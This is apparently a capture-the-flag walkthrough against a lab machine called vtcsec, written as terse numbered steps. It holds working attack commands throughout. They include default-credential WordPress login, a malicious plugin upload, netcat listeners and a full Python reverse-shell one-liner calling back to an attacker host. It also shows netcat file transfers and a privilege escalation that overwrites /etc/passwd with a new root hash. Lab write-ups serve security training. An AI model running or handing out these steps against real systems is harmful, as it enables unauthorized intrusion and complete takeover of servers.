[*]
1. Nmap scan on host for common ports:
  FTP, SSH, and HTTP
[*]
2. Gobuster scan on web server 172.16.16.8
gobuster -u 172.16.16.8 -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 80 -a Linux
[*]
3. Added DNS for hostname vtcsec & vtcsec.com in hostfile
nano /etc/hosts
172.16.16.8     vtcsec.com
172.16.16.8     vtcsec
[*]
4. Navigated to http://vtcsec.com/secure
**found wp-login at the login buttom
[*]
5. Attempted user admin/ password admin with success
[*]
6. Downloaded Word Press PWN from github, modified payload to php/reverse_php
nano wordpwn.py ** replaced playoad to php/reverse_php
generated word press plugin/payload with LHOST 172.16.16.7, LPORT 4444
gerated zip file
[*]
7. Through wp-admin page uploaded malicous plugin
[*]
8. Created NC listener, and went to exploit page
nc -nvlp 4444
http://172.16.16.8/secret/wp-content/plugins/malicous/wetw0rk_maybe.php
**got reverse listener shell with user www-data**
[*]
9. Setup new lister, and generated more stable python shell
nc -nvlp 4445
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.16.7",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
[*]
10. Downloaded unix-privsc-check from pentestmonkey, uploaded it to remote host
nc -nvlp 4444 < unix-privesc-check **localhost**
nc -nv 172.16.16.8 4444 > priv.sh **from web server**
[*]
11. Ran priv.sh
chmod +x priv.sh
./priv.sh > output.txt
cat output.txt | grep WARNING
**vulnerable /etc/passwd file detected. This means you can overwrite root user hash
[*]
12. Copied passwd file from remote host, and gerated new one
nc -nvlp 4444 < passwd **local host listens for file **
nc -nv 172.16.16.7 4444 < /etc/passwd **loaded file from remote host**
openssl passwd -1 **used to generate new hash
1$OtCJ55gN$EC1OTlYH5zm2rDNKXDmcW0
[*]
13. Copied new hash and put it in root
root:$1$OtCJ55gN$EC1OTlYH5zm2rDNKXDmcW0:0:0:root:/root:/bin/bash
[*]
14. Transfered new passwd file to remote host
nc -nvlp 4444 < passwd **upload new passwd file**
nc -nv 172.16.16.7 4444 > passwd **downloaded new passwd file**
**verified contents of file**
cp passwd /etc/passwd
[*]
15. Changed shell to more interactive version ** to change user to root**
python2.7 -c 'import pty; pty.spawn("/bin/bash")'
[*]
16. Grabbed flag
su root -l
whoami
ifconfig
whoami
root
root@vtcsec:~# ifconfig
ifconfig
enp0s3    Link encap:Ethernet  HWaddr 08:00:27:14:06:50  
          inet addr:172.16.16.8  Bcast:172.16.16.255  Mask:255.255.255.0
[*]